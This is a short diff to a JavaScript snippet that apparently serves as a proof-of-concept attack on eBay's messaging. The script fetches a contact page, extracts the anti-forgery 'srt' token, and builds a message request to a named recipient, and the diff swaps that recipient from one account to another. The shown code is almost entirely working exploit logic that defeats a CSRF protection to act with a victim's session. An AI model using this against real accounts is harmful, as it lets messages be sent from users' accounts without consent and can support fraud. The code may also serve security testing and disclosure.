@@ -1,5 +1,5 @@
 // Fetch the 'sendToken' value from the source code
-fetch('https://www.ebay.com/contact/sendmsg?recipient=oumastore&message_type_id=14')
+fetch('https://www.ebay.com/contact/sendmsg?recipient=payna6675&message_type_id=14')
   .then(response => response.text())
   .then(html => {
     // Parse the HTML to find the 'srt' value
@@ -16,7 +16,7 @@ fetch('https://www.ebay.com/contact/sendmsg?recipient=oumastore&message_type_id=
       // Create the request body in the desired format with the extracted 'sendToken' value
       const requestBody = JSON.stringify({
         message: "ThisIsaTestPOOC-after-1Month",
-        recipient: "oumastore",
+        recipient: "payna6675",
         attachments: [],
         srt: extractedSrt,
         subject: null,
